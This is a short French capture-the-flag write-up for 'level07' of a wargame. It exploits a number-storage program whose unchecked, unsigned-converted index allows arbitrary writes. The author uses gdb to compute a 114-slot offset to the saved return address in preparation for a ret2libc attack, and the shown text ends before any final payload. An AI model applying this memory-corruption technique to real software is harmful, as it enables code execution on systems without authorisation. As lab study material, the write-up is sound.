# Level 07

```
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 42
 Index: 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: store
 Number: 420
 Index: 1
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 0
 Completed read command successfully
Input command: read
 Index: 1
 Number at data[1] is 420
 Completed read command successfully
Input command: read
 Index: -1
 Number at data[4294967295] is 0
 Completed read command successfully
Input command: store
 Number: 42
 Index: -2
 Completed store command successfully
Input command: readt
 Index: -2
 Number at data[4294967294] is 42
 Completed readt command successfully
Input command: quit
```
Ce programme nous permet de stocker des nombres dans un tableau. Cependant, certains case sont réservées pour `wil`.<br />
On peut voir que le programme utilise des entiers non signés pour stocker les index. Cela signifie que si on rentre un index négatif, il sera converti en un entier non signé. Par exemple, `-1` deviendra `4294967295` (2^32 - 1).

Après avoir disassemblé le programme, on sait que le tableau a une taille de 100 nombres mais il n'y a pas de check sur l'index.

Donc on peut trouver le offset pour pouvoir écrire dans eip avec gdb

En premier temps on va trouver l'address d'eip
```sh
(gdb) b main
(gdb) r
(gdb) i f
...
 Saved registers:
  ebp at 0xffffcc58, eip at 0xffffcc5c

```
Ensuite on va trouver l'address de stockage, en regardant dans le code disas en appercois que l'offset est de `esp + 36` et soustraire les deux address.<br/>
On va devoir aussi diviser par 4 vu que le stockage stock les nombres sont contenu en four-byte integer. On obtient bien notre offset de 114 pour écrire notre ret2libc

```sh
(gdb) p $esp + 36
$8 = (void *) 0xffffca94
(gdb) p (0xffffcc5c - 0xffffca94)
$9 = 456
(gdb) p (0xffffcc5c - 0xffffca94) /4
$10 = 114
(gdb)
```

